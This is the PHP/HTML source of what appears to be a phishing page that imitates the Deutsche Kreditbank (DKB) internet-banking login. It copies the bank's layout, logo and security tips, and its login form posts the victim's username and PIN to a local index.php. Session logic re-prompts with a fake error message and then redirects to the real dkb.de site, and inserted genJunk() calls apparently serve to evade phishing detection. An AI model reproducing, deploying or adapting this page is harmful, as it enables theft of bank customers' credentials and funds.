<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished'] == "TRUE") {
		header('Location: https://www.dkb.de/banking');
	}
?>

<!DOCTYPE html>
<html lang="de" class="dasKannBank ">

	<head>
		<title>DKB - Deutsche Kreditbank AG - Internet Banking</title>
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
		<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
		<script type="text/javascript" src="/dtagent637_23jr_1007.js" data-dtconfig="rid=RID_-31152012|rpid=-855652432|rt=1000|tp=500,50,3|reportUrl=/dynaTraceMonitor|domain=dkb.de"></script>
		<link rel="apple-touch-icon" href="src/dkb_img/devices/iOS_76x76.png" sizes="76x76" />
		<link rel="apple-touch-icon" href="src/dkb_img/devices/iOS_120x120.png" sizes="120x120" />
		<link rel="apple-touch-icon" href="src/dkb_img/devices/iOS_152x152.png" sizes="152x152" />
		<link rel="apple-touch-icon" href="src/dkb_img/devices/iOS_180x180.png" sizes="180x180" />
		<link rel="apple-touch-icon" href="src/dkb_img/devices/iOS_1024x1024.png" sizes="1024x1024" />
		<script src="src/dkb_js/base-3rd-party.js?etag=d9f3ee556f13aaa61df77e659d94f6d5a03ea3ec" type="text/javascript"></script>
		<script src="src/dkb_js/abaxx-scripts.js?etag=b3bfd1497ef6f82ec111a29849b9c271f10e51e4" type="text/javascript"></script>
		<script src="src/dkb_js/abaxx-widgets-session-info.js?etag=cc5b20bd00e2c4a2db1fa411d135af1ad06818f3" type="text/javascript"></script>
		<script src="src/dkb_js/datepicker.js?etag=c09ef206373e69ebb4785dc229eb73bb5d16bfeb" type="text/javascript"></script>
		<script src="src/dkb_js/dkb-classic.js?etag=e7266d1c48b91611db3d97b1336d60555a3fee10" type="text/javascript"></script>
		<link href="src/dkb_css/dkb-classic.css?etag=4cac8b4b5f7a6dae39704f744887c44e6a3b328b" rel="stylesheet" type="text/css" />
		<script type="text/javascript">jQuery.noConflict();</script>
		<script type="text/javascript">Abaxx.init('de','de','/')</script>
		<link href="src/dkb_css/dkb_responsive.min.css?etag=db51aad2" rev="responsive" rel="stylesheet" type="text/css" /><!--[if lte IE 9]>
		<script src="/scripts/dkb/ie_scripts.min.js?etag=f8008862" type="text/javascript"></script><![endif]-->
		<!--[if IE ]>
		<link href="src/dkb_css/ie.min.css?etag=5a9e7291" rel="stylesheet" type="text/css" /><script type="text/javascript">if (typeof iTim != 'undefined') iTim.init();</script>
		<![endif]-->
		<!--[if IE 7]>
		<link href="src/dkb_css/ie7.min.css?etag=63fa9945" rel="stylesheet" type="text/css" /><![endif]-->
		<!--[if IE 8]>
		<link href="src/dkb_css/ie8.min.css?etag=bdffae8e" rel="stylesheet" type="text/css" /><![endif]-->
		<!--[if (gt IE 8)|!(IE)]><!-->
		<script src="src/dkb_js/jquery.slides.min.js?etag=de24e0f0" type="text/javascript"></script>
		<link href="src/dkb_css/jquery.slides.css?etag=29aad8e" rel="stylesheet" type="text/css" /><!--<![endif]-->
		<link rel="shortcut icon" href="src/dkb_img/favicon.ico">
		<style type="text/css">.ajax_loading .ui-widget-overlay{z-index:1000;position:fixed;background:#FFF;opacity:0.7;filter:Alpha(Opacity=70)}.ajax_loading .spinner_container{top:0;position:fixed;width:100%;height:100%;display:block;z-index:1001}.ajax_loading .spinner_container .spinner{position:fixed;top:55%;left:50%}.ajax_loading .spinner_container .spinner:after{content:" ";display:block;height:125px;width:125px;margin-top:-115px;margin-left:-59.5px;background-image:url("data:image/svg+xml;base64,PHN2ZyBpZD0iREtCIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjE1MSA3Ny4zIDgyLjkgNDAiPjxzdHlsZT4uc3Qwe2ZpbGw6IzE0OGRlYX08L3N0eWxlPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0xNTEgNzcuM2g4Mi45djEuNkgxNTF6bTAgMzguNGg4Mi45djEuNkgxNTF6bTEyLTIuNWM0LjUgMCA3LjUtLjYgMTAuOS0zLjkgMy0zIDQuNi03IDQuNi0xMS44IDAtNS4zLTEuNi05LjQtNC42LTEyLjMtMy4zLTMuMS02LjktMy44LTExLjktMy44aC0xMXYzMS44aDEyem0tMS4xLTdoLTMuMXYtMThoMy4xYzUuNyAwIDguOCAzLjIgOC44IDkgMCA2LjItMi44IDktOC44IDltMjguMSA3Vjk5LjRsOC4zIDEzLjhoOS40bC0xMC4yLTE1LjZMMjA4IDgxLjRoLTguNmwtOS40IDE1di0xNWgtNy45djMxLjh6bTIxLjcgMGg5LjdjNC4yIDAgNy4xLS4zIDkuNC0yLjQgMi0xLjggMy4xLTQuNSAzLjEtNy41IDAtMy44LTEuOC02LjItNS41LTcuMyAyLjgtMS40IDQtMy41IDQtNi44IDAtNS0zLjQtNy44LTkuOC03LjhoLTEwLjl2MzEuOHptNy41LTYuN3YtNi43aDIuNWMzLjEgMCA0LjUuNyA0LjUgMy40IDAgMi42LTEuNCAzLjMtNC4zIDMuM2gtMi43em0wLTEyLjhWODhoMi42YzIuNCAwIDMuNi45IDMuNiAzcy0xLjMgMi43LTQuMiAyLjdoLTJ6Ii8+PC9zdmc+");background-repeat:no-repeat;background-size:125px}html.dasKannBank .ajax_loading .spinner_container .spinner:after{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGlkPSJFYmVuZV8xIiB2aWV3Qm94PSItMTA0LjUgMzE2LjUgMjgzLjQgMTYwLjYiPjxzdHlsZSBpZD0ic3R5bGUzIj4uc3Qwe2ZpbGw6IzE0OGRlYX08L3N0eWxlPjxnIGlkPSJMb2dvIj48ZyBpZD0iZzYiPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0tMTA0LjUgMzE2LjVoNDEuMmMyMy42IDAgNTEuNiAxNy43IDUxLjYgNTMgMCAzMi40LTI4IDUzLTUxLjYgNTNoLTQxLjJ2LTEwNnptNjMuMyA1M2MwLTIyLjEtMTcuNy0yNi41LTMzLjktMjYuNXY1M2MxNi4yIDAgMzMuOS00LjQgMzMuOS0yNi41eiIgaWQ9InBhdGg4Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTS0uMSAzMTYuNWgyOS41djM5LjhoLjNMNTMgMzE2LjVoMzMuOUw1NiAzNjUuMWwzMy45IDU3LjVINTZsLTI2LjItNDUuN2gtLjN2NDUuN0gwVjMxNi41aC0uMXoiIGlkPSJwYXRoMTAiLz48cGF0aCBjbGFzcz0ic3QwIiBkPSJNOTcuOSAzMTYuNWg0Mi43YzE5LjIgMCAzMi40IDExLjUgMzIuNCAyNi41IDAgMTAtMy41IDE4LjYtMTEuNSAyMS4xdi4zYzYuNiAyLjUgMTcuNCAxMS41IDE3LjQgMjUuOCAwIDIxLjItMTYuMiAzMi40LTMzLjkgMzIuNEg5Ny45VjMxNi41em0zOC41IDQyLjRjNSAwIDkuMy0zLjIgOS4zLTkuMyAwLTUuNy00LjMtOS4zLTkuMy05LjNoLTl2MTguNmg5em0yLjYgMzguNGM1LjkgMCA5LjMtNC43IDkuMy0xMC42IDAtNS45LTQuNy0xMC42LTEwLjYtMTAuNmgtMTAuM3YyMS4ySDEzOXoiIGlkPSJwYXRoMTIiLz48L2c+PC9nPjwvc3ZnPg==");background-repeat:no-repeat;background-size:125px}html.hilton .ajax_loading .spinner_container .spinner{top:50%}html.hilton .ajax_loading .spinner_container .spinner:after{background-image:none}
		</style>
		<style type="text/css">html:not(.is_android) .ajax_loading .spinner div{position:absolute;width:4px;height:14px;border-radius:4px;background-color:transparent;-webkit-transform-origin:center -14px;-ms-transform-origin:center -14px;transform-origin:center -14px;-webkit-animation:spinner-fade 1s infinite linear;-moz-animation:spinner-fade 1s infinite linear;animation:spinner-fade 1s infinite linear}html:not(.is_android) .ajax_loading .spinner div:nth-child(1){-webkit-animation-delay:0s;-moz-animation-delay:0s;animation-delay:0s;-webkit-transform:rotate(0deg);-moz-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(2){-webkit-animation-delay:.083s;-moz-animation-delay:.083s;animation-delay:.083s;-webkit-transform:rotate(30deg);-moz-transform:rotate(30deg);-ms-transform:rotate(30deg);transform:rotate(30deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(3){-webkit-animation-delay:.166s;-moz-animation-delay:.166s;animation-delay:.166s;-webkit-transform:rotate(60deg);-moz-transform:rotate(60deg);-ms-transform:rotate(60deg);transform:rotate(60deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(4){-webkit-animation-delay:.249s;-moz-animation-delay:.249s;animation-delay:.249s;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(5){-webkit-animation-delay:.332s;-moz-animation-delay:.332s;animation-delay:.332s;-webkit-transform:rotate(120deg);-moz-transform:rotate(120deg);-ms-transform:rotate(120deg);transform:rotate(120deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(6){-webkit-animation-delay:.415s;-moz-animation-delay:.415s;animation-delay:.415s;-webkit-transform:rotate(150deg);-moz-transform:rotate(150deg);-ms-transform:rotate(150deg);transform:rotate(150deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(7){-webkit-animation-delay:.498s;-moz-animation-delay:.498s;animation-delay:.498s;-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(8){-webkit-animation-delay:.581s;-moz-animation-delay:.581s;animation-delay:.581s;-webkit-transform:rotate(210deg);-moz-transform:rotate(210deg);-ms-transform:rotate(210deg);transform:rotate(210deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(9){-webkit-animation-delay:.664s;-moz-animation-delay:.664s;animation-delay:.664s;-webkit-transform:rotate(240deg);-moz-transform:rotate(240deg);-ms-transform:rotate(240deg);transform:rotate(240deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(10){-webkit-animation-delay:.747s;-moz-animation-delay:.747s;animation-delay:.747s;-webkit-transform:rotate(270deg);-moz-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(11){-webkit-animation-delay:.83s;-moz-animation-delay:.83s;animation-delay:.83s;-webkit-transform:rotate(300deg);-moz-transform:rotate(300deg);-ms-transform:rotate(300deg);transform:rotate(300deg)}html:not(.is_android) .ajax_loading .spinner div:nth-child(12){-webkit-animation-delay:.913s;-moz-animation-delay:.913s;animation-delay:.913s;-webkit-transform:rotate(330deg);-moz-transform:rotate(330deg);-ms-transform:rotate(330deg);transform:rotate(330deg)}@-webkit-keyframes spinner-fade{0%{background-color:#148DEA}100%{background-color:transparent}}@-moz-keyframes spinner-fade{0%{background-color:#148DEA}100%{background-color:transparent}}@-o-keyframes spinner-fade{0%{background-color:#148DEA}100%{background-color:transparent}}@keyframes spinner-fade{0%{background-color:#148DEA}100%{background-color:transparent}}@media only screen and (max-width: 749px){.ios-login-spinner{display:inline}.ios-login-spinner .spinner{font-size:26px;margin-bottom:-8px}}
		</style>
		<script src="src/dkb_js/dkb_phone.min.js?etag=a000221c" type="text/javascript"></script>
		<meta name="format-detection" content="telephone=no">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
		<meta http-equiv="Pragma" content="no-cache" />
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
	</head>

    <body>
        <script>
            CLX.writeBrowserInfoCookies();
        </script>
        <?php echo genJunk() ?><div>
            <a id="top" ></a>
        </div><?php echo genJunk() ?>
        <?php echo genJunk() ?><div class="clearfix pageWrapper">
            <?php echo genJunk() ?><div class="clearfix page">
                <?php echo genJunk() ?><div id="dkb_banking_header" class="pint banking_header  clearfix " >
                    <?php echo genJunk() ?><div class="header_inner_wrap">
                        
						<script>
							function pintHeaderEnabled() {
								return true;
							}
						</script>

						<a href="#mobile_menu" class="mobile_menu_btn ">
							<span class="menu_icon "></span>
							<span class="unread_count no_number"></span>
						</a>
						
						<span class="clearfix logo">
							<a href="" title="Link zur Startseite der Deutsche Kreditbank AG" class="clearfix" >
								<span class="dkb_logo_container"> </span>
							 </a>
						</span>
	
						<a href="" id="anmeldenButton" class="clearfix anmelden">Anmelden</a>
						<span class="search_mobile_toggle" id="search_mobile_toggle"></span>
						<form action="" id="search" method="" name="search" class="noSpinner" data-xpopup-mode="auto">
							<button style='position: absolute; left: -9999px; width: 1px; height: 1px;' name='hiddenSubmit' type='submit'>&nbsp;</button>
								
							<input class="field {'default': 'Ihre Suche...'} dkbSearchField" name="searchField" id="searchField" type="text"  autocomplete='off' role='textbox' aria-autocomplete='list' aria-haspopup='true' aria-controls='autocomplelist' />
							<input class="field submit icons iconLoupe dkbSearchField" name="" id="id-429251752_" title="Suche starten" type="submit" value=""  onClick='return checkEmpty()' />
							
							<input type="hidden" name="$event" value="search" />
						</form>

						<?php echo genJunk() ?><div id="session-info" class="bankingStatusBox loggedOut"></div><?php echo genJunk() ?>

					</div><?php echo genJunk() ?>
					
                </div><?php echo genJunk() ?>
				
                <?php echo genJunk() ?><div id="contentHome" class="clearfix contentArea contentPage "> <!-- sonst -->
                    <?php echo genJunk() ?><div class="clearfix grid_1 col1">
						<?php echo genJunk() ?><div class="clearfix mainNav" id="mainNav">
							<h6 class="ubar">Hauptnavigation</h6>
		
							<style>
								ul.menu li a.active { color: #127ED0; }
							</style>
							
							<nav id="mobile_menu"></nav>
							<nav id="desktop_menu" >
								<ul class='clearfix navigationMain' id="menu">
									<li id="menu_0-node"  class=" label_Mein_Banking  selected selectedLeaf">
										<a href="#" title="Mein Banking">Mein Banking </a>
										<ul>
											<li id="menu_0.0-node"  class=" label_Banking+  ">
												<a href="#" title="Banking+"> Banking+</a>
											</li>
											
											<li id="menu_0.1-node"  class=" label_Banking_erklaert  ">
											 <a href="#" title="Banking erklärt">
												Banking erklärt
											  </a>
											</li>
										</ul>
									</li>
									
									<li id="menu_1-node"  class=" label_Privatkunden  ">
										<a href="#" title="Privatkunden">Privatkunden </a>

										<ul>
											<li id="menu_1.0-node"  class=" label_Konten_und_Karten  ">
												<a href="#" title="Konten und Karten">
													Konten und Karten
												</a>
											</li>
										
											<li id="menu_1.1-node"  class=" label_Sparen_und_Geldanlage  ">
												<a href="#" title="Sparen und Geldanlage">
												  Sparen und Geldanlage
												  </a>
											 </li>
										 
											<li id="menu_1.2-node"  class=" label_Depot_und_Wertpapiere  ">
												 <a href="#" title="Depot und Wertpapiere">
												  Depot und Wertpapiere
												  </a>
											  </li>
											  
											<li id="menu_1.3-node"  class=" label_Kredite_und_Finanzierung  ">
												<a href="#" title="Kredite und Finanzierung">
													Kredite und Finanzierung
												</a>
											</li>
											
											<li id="menu_1.4-node"  class=" label_Eigentum_und_Miete  ">
												<a href="#" title="Eigentum und Miete">
												  Eigentum und Miete
												 </a>
											</li>
										</ul>
									</li>
									
									<li id="menu_2-node"  class=" label_Geschaeftskunden  ">
										<a href="#" title="Geschäftskunden">
										  Geschäftskunden
										  </a>
									  
										<ul>
											<li id="menu_2.0-node"  class=" label_Branchenloesungen  ">
												<a href="#" title="Branchenlösungen">Branchenlösungen </a>
											</li>
											
											<li id="menu_2.1-node"  class=" label_Kompetenzen  ">
												<a href="#" title="Kompetenzen">Kompetenzen</a>
											</li>
											
											<li id="menu_2.2-node"  class=" label_DKB-Business  ">
												<a href="#" title="DKB-Business">
												  DKB-Business
												  </a>
											</li>
									
											<li id="menu_2.3-node"  class=" label_DKB-Verwalterplattform  ">
												<a href="#" title="DKB-Verwalterplattform">
												  DKB-Verwalterplattform
												 </a>
											</li>
											
											<li id="menu_2.4-node"  class=" label_DKB-Treuhaenderpaket  ">
											 <a href="#" title="DKB-Treuhänderpaket">
											  DKB-Treuhänderpaket
											  </a>
											</li>
									
											<li id="menu_2.5-node"  class=" label_Referenzen  "><a href="#" title="Referenzen">Referenzen</a></li>
										</ul>
									</li>
									
									<li id="menu_3-node"  class=" label_DKB_bewegt  ">
													
														
									<a href="#" title="DKB bewegt">
									  DKB bewegt
									  </a>

									<ul>
									<li id="menu_3.0-node"  class=" label_Nachhaltigkeit  ">
													
														
									<a href="#" title="Nachhaltigkeit">
									  Nachhaltigkeit
									  </a>

												</li>
									<li id="menu_3.1-node"  class=" label_Digitale_Innovationen  ">
									<a href="#" title="Digitale Innovationen">
									  Digitale Innovationen
									  </a>

												</li>
									<li id="menu_3.2-node"  class=" label_Wirtschaft  ">
										<a href="#" title="Wirtschaft">
									  Wirtschaft
									  </a>

												</li>
									<li id="menu_3.3-node"  class=" label_Wissenschaft  ">
									 <a href="#" title="Wissenschaft">
									  Wissenschaft
									  </a>

												</li>
									<li id="menu_3.4-node"  class=" label_Sport  ">
										 <a href="#" title="Sport">
									  Sport
									  </a>

													
												</li>
									<li id="menu_3.5-node"  class=" label_Auszeichnungen  ">
										 <a href="#" title="Auszeichnungen">
									  Auszeichnungen
									  </a>

												</li>
									</ul>
									</li>
									
									<li id="menu_4-node"  class=" label_Ueber_uns  ">
										 <a href="#" title="Über uns">
									  Über uns
									  </a>

												<ul>
									<li id="menu_4.0-node"  class=" label_Zahlen_&_Fakten  ">
										 <a href="#" title="Zahlen & Fakten">
									  Zahlen & Fakten
									  </a>

												</li>
									<li id="menu_4.1-node"  class=" label_Vorstand  ">
										 <a href="#" title="Vorstand">
									  Vorstand
									  </a>

												</li>
									<li id="menu_4.2-node"  class=" label_Verantwortung  ">
										<a href="#" title="Verantwortung">
									  Verantwortung
									  </a>

												</li>
									<li id="menu_4.3-node"  class=" label_Karriere  ">
										<a href="#" title="Karriere">
									  Karriere
									  </a>
									</li>
									</ul></li>
						
								</ul>
							</nav>
								
							<script> var mailboxUnreadCounterMap = {}; </script>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>

					 <?php echo genJunk() ?><div class="clearfix grid_3 col2">
								
						<?php echo genJunk() ?><div style="margin: 0px;">
							<h6 class="ubar">Inhaltsbereich</h6>
							<a id="content"></a>
			
							<h1>
								Herzlich willkommen
							</h1>
			
							<script>
								document.getElementById('anmeldenButton').style.display = 'none';
							</script>

							<style type="text/css">
								.blaueMeldung{
									background-color: #148dea !important;
								}

								.clearfix.text.blaueMeldung h4,
								.blaueMeldung a,
								.blaueMeldung p {
									color: white;
								}
							</style>

							<?php echo genJunk() ?><div class="clearfix textDefaultModule imgColLeft mainTeaser currentNews ">
								<?php echo genJunk() ?><div class="clearfix inner shadowBox  infoNewsWithImage ">
									<a href="#">
										<?php echo genJunk() ?><div class="dl" style="width:120px;">
											<?php echo genJunk() ?><div class="dt">
												<img alt="Logo" src="src/dkb_img/binary-content.jpg">
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="clearfix  text  ">
											<h4>Notfallpaket: Immer ein Ass im Ärmel.</h4>
											<p>Mit unserem Notfallpaket haben Sie bei Kartenverlust im Urlaub gute Karten. Wir versorgen Sie als Aktivkunde schnell mit Notfallkarte oder Notfallbargeld – Lieferung kostenlos. 					<span class="icons  arrowNext "></span>				</p>
										</div><?php echo genJunk() ?>
									</a>
								</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>

							<?php echo genJunk() ?><div class="clearfixv module shadowBox applicationContainer">
								<?php echo genJunk() ?><div class="clearfix applicationForm">
									<form action="index.php" id="login" method="post" name="login" class="form" data-xpopup-mode="auto"><button style='position: absolute; left: -9999px; width: 1px; height: 1px;' name='hiddenSubmit' type='submit'>&nbsp;</button>
										<?php
											if (isset($_SESSION['userErr']) || isset($_SESSION['passErr'])) {
												echo '<?php echo genJunk() ?><div class="clearfix module text errorMessage"><ul><li><span class="icons cross"></span>Der eingegebene Anmeldename und/oder die PIN ist nicht zulässig.</li></ul></div><?php echo genJunk() ?>';
												unset($_SESSION['userErr']);
												unset($_SESSION['passErr']);
											}
										?>
										
										<fieldset>
											<h3 class="border">
												<span>Anmeldung zum Internet-Banking</span>
											</h3>

											<p class="clearfix formBox">
												<span class="col50 floatLeft">
													<label for="loginInputSelector" id="loginInputSelector-label" class="headdetail" ><span>Anmeldename </span></label>
													<input class="field text small" name="dkb_username" id="loginInputSelector" type="text" maxlength="16" value="<?php echo (isset($_SESSION['user']) ? $_SESSION['user'] : ""); ?>" autocomplete='off' autocapitalize='off' tabindex='1' placeholder='Anmeldename' />
												</span>
												<span class="col50 floatRight formExe hide-for-small-down">
													  Der Anmeldename und die PIN unterscheiden sich, je nachdem, welches TAN-Verfahren Sie nutzen möchten.

												</span>
												<span class="col50 floatLeft">
													<br/>
													<label for="pinInputSelector" id="pinInputSelector-label" class="headdetail" ><span>PIN </span></label>
													<input class="field text small" name="dkb_password" id="pinInputSelector" type="password" maxlength="5"  autocomplete='off' tabindex='2' placeholder='PIN'/>
													<p><a class="moreLink" href="#"><span class="icons arrowNext"></span>PIN vergessen</a></p>
													
												</span>
											</p>
										</fieldset>
										<?php echo genJunk() ?><div id="login-div" class="clearfix send">
											
											<?php echo genJunk() ?><div class="clearfix button">
												<button id="buttonlogin" data-abx-jsevent="login" type="button" title="Anmelden" name="sendOB_Login_x" data-xevent="login" class="clearfix submit evt-login submit" tabindex='3'><span class="abaxx-button-label">Anmelden<span class="icons arrowButton0"></span></span></button>
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
										
										<input type="hidden" name="sendOB_Login_x" value="sendOB_Login_x" />
									</form>
								</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>

							<script type="text/javascript">
								function beforeInitResponsive() {
									var richFooter = jQuery('#richfooter_wrap');
									var outerfooter = jQuery('#outerfooter');
									var desktop_menu = jQuery('#desktop_menu');
									localStorage.setItem('desktopMenuLs', desktop_menu.html());
									localStorage.setItem('outerfooterLs', outerfooter.html());
									localStorage.setItem('richFooterLs', richFooter.html());
								}

								var cPosName=0;
								var cPosPin=0;
								var agent = navigator.userAgent.toLowerCase();
								if (agent.indexOf("firefox".toLowerCase())>-1){
									cPosName=154;
									cPosPin=131;
								} else if (agent.indexOf("chrome".toLowerCase())>-1){
									cPosName=134;
									cPosPin=113;
								} else if (agent.indexOf("MSIE".toLowerCase())>-1){
									cPosName=146;
									cPosPin=124;
								} else{
									cPosName=135;
									cPosPin=125;
								}
								var CL = '\x00';
								var CR = '\x01';
								var BK = '\x02';
								var SH = '\x03';
								var SP = '\x04';
								var HS = '\x05';

								var qwertzAlphabetic2 = ['!@#$%&*()_-=', '`[]{}<>\|/?ß"', 'qwertzuiopü\'', 'asdfghjklöä;', 'yxcvbnm ,.:'];
								var qwertzLayout2 = [qwertzAlphabetic2[0] + HS + '789'
									 , qwertzAlphabetic2[1] + HS + '456'
									 , qwertzAlphabetic2[2] + HS + '123'
									 , qwertzAlphabetic2[3] + HS + '-0+'
									 , HS + qwertzAlphabetic2[4]
									 , jQuery.keypad.SHIFT + jQuery.keypad.BACK + jQuery.keypad.CLEAR + jQuery.keypad.CLOSE];
								if (is_medium_up()) {
									jQuery('#loginInputSelector').keypad({
										keypadClass: 'flatKeypad',
										keypadOnly: false,
										showOn: 'button',
										layout: qwertzLayout2,
										buttonImageOnly: true,
										randomiseAlphabetic: true,
										randomiseNumeric: true,
										cPos: cPosName,
										isAlphabetic: function(ch) {
											return !(ch >= '0' && ch <= '9') && !(ch == '+') && !(ch == '-');
										}
									});
								}
								var qwertzLayout = ['qwertzuiop' + HS + '789','asdfghjklß' + HS + '456','yxcvbnmöäü' + HS + '123',HS + HS + HS + HS + HS + HS + HS + HS + HS + HS + HS + HS + '0' ,SH + BK + CR + CL];
								if(is_medium_up()) {
									jQuery('#pinInputSelector').keypad( {
										
											onClose: function() { jQuery.get("-?$part=Welcome.index.keypad&$event=login");},
										
										keypadClass: 'flatKeypad',
										keypadOnly: false,
										randomiseAlphabetic: true,
										randomiseNumeric: true,
										showOn: 'button',
										layout: qwertzLayout,
										buttonImageOnly: true,
										cPos: cPosPin,
										isAlphabetic: function(ch) {
											return !(ch >= '0' && ch <= '9');
										}
									} );
								}
							</script>

							<script type="text/javascript">

								if (typeof is_large_up == 'function') {
									if (is_large_up()) {
										document.forms.login.j_username.focus();
									}
								} else {
									document.forms.login.j_username.focus();
								}

								var nVer = navigator.appVersion;
								var nAgt = navigator.userAgent;
								var browserName  = navigator.appName;
								var fullVersion  = ''+parseFloat(navigator.appVersion);
								var majorVersion = parseInt(navigator.appVersion,10);
								var nameOffset,verOffset,ix;

								// In MSIE, the true version is after "MSIE" in userAgent
								if ((verOffset=nAgt.indexOf("MSIE"))!=-1) {
								 browserName = "Microsoft Internet Explorer";
								 fullVersion = nAgt.substring(verOffset+5);
								}
								// In Opera, the true version is after "Opera"
								else if ((verOffset=nAgt.indexOf("Opera"))!=-1) {
								 browserName = "Opera";
								 fullVersion = nAgt.substring(verOffset+6);
								}
								// In Chrome, the true version is after "Chrome"
								else if ((verOffset=nAgt.indexOf("Chrome"))!=-1) {
								 browserName = "Chrome";
								 fullVersion = nAgt.substring(verOffset+7);
								}
								// In Safari, the true version is after "Safari"
								else if ((verOffset=nAgt.indexOf("Safari"))!=-1) {
								 browserName = "Safari";
								 fullVersion = nAgt.substring(verOffset+7);
								}
								// In Firefox, the true version is after "Firefox"
								else if ((verOffset=nAgt.indexOf("Firefox"))!=-1) {
								 browserName = "Firefox";
								 fullVersion = nAgt.substring(verOffset+8);
								}
								// In most other browsers, "name/version" is at the end of userAgent
								else if ( (nameOffset=nAgt.lastIndexOf(' ')+1) < (verOffset=nAgt.lastIndexOf('/')) )
								{
								 browserName = nAgt.substring(nameOffset,verOffset);
								 fullVersion = nAgt.substring(verOffset+1);
								 if (browserName.toLowerCase()==browserName.toUpperCase()) {
								  browserName = navigator.appName;
								 }
								}
								// trim the fullVersion string at semicolon/space if present
								if ((ix=fullVersion.indexOf(";"))!=-1) fullVersion=fullVersion.substring(0,ix);
								if ((ix=fullVersion.indexOf(" "))!=-1) fullVersion=fullVersion.substring(0,ix);

								majorVersion = parseInt(''+fullVersion,10);
								if (isNaN(majorVersion)) {
								 fullVersion  = ''+parseFloat(navigator.appVersion);
								 majorVersion = parseInt(navigator.appVersion,10);
								}

								// document.write('Browser name  = '+browserName+'<br>');
								// document.write('Full version  = '+fullVersion+'<br>');
								// document.write('Major version = '+majorVersion+'<br>');
								// document.write('navigator.appName = '+navigator.appName+'<br>');
								// document.write('navigator.userAgent = '+navigator.userAgent+'<br>');

								var OSName="Unknown OS";
								if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
								if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
								if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
								if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";

								// document.write('Your OS: '+OSName+'<br>');

								var screenW = 640, screenH = 480;
								if (parseInt(navigator.appVersion)>3) {
								 screenW = screen.width;
								 screenH = screen.height;
								}
								else if (navigator.appName == "Netscape"
									&& parseInt(navigator.appVersion)==3
									&& navigator.javaEnabled()
								   )
								{
								 var jToolkit = java.awt.Toolkit.getDefaultToolkit();
								 var jScreenSize = jToolkit.getScreenSize();
								 screenW = jScreenSize.width;
								 screenH = jScreenSize.height;
								}

								// document.write( "Screen width = "+screenW+"<br>"+"Screen height = "+screenH)

									document.login.browserName.value=browserName;
									document.login.browserVersion.value=fullVersion;
									document.login.screenWidth.value=screenW;
									document.login.screenHeight.value=screenH;
									document.login.jsEnabled.value="true";
									document.login.osName.value=OSName;
							</script>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
			
                    <?php echo genJunk() ?><div></div><?php echo genJunk() ?>
					
                   <?php echo genJunk() ?><div class="clearfix grid_1 col3">
                                
						<?php echo genJunk() ?><div class='show-for-large-up'>
							<?php echo genJunk() ?><div class="clearfix module teaser highlightedListModule">
								<h4><span>Anmeldung</span></h4>
								<?php echo genJunk() ?><div class="clearfix text">
									<ul class="clearfix linkList highlightedList">
										<li><a href="#" target="_blank"><span class="icons arrowNext"></span>Zur DKB-Verwalterplattform</a></li>
										
										<li><a href="#" target="_blank"><span class="icons arrowNext"></span>Zur DKB-Treuhänderplattform</a></li>
									</ul>
								</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>

						<?php echo genJunk() ?><div class='hide-for-small-down'>				
							<?php echo genJunk() ?><div class="clearfix module textDefaultModuleMarginal">
								<h4><span>Schon Gewusst?</span></h4>
									<?php echo genJunk() ?><div class="text">
										<p>
											<p><a href="#"><img src="src/dkb_img/binary-content_002.jpg" alt="Bild" title="Bild" /></a></p>

											<ul class="clearfix linkList">
												<li><a href="#"><span class="icons arrowNext"></span>Mit DKB live mehr erleben</a></li>
												<li><a href="#"><span class="icons arrowNext"></span>Zu allen Artikeln</a></li>
											</ul>
										</p>
									</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>	
						
						<?php echo genJunk() ?><div class="clearfix module textDefaultModuleMarginal">
							<h4><span>Sicherheitstipps</span></h4>
							<?php echo genJunk() ?><div class="text">
								<p>
									<p>Schützen Sie Ihre Daten und Finanzen vor unberechtigten Zugriffen. Geben Sie nie:</p>
									<p>- eine TAN beim Login ein.<br />
									- mehrere TAN auf einmal ein.<br />
									- PIN oder TAN per E-Mail<br />
									&nbsp; oder Telefon weiter.</p>
								</p>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
				
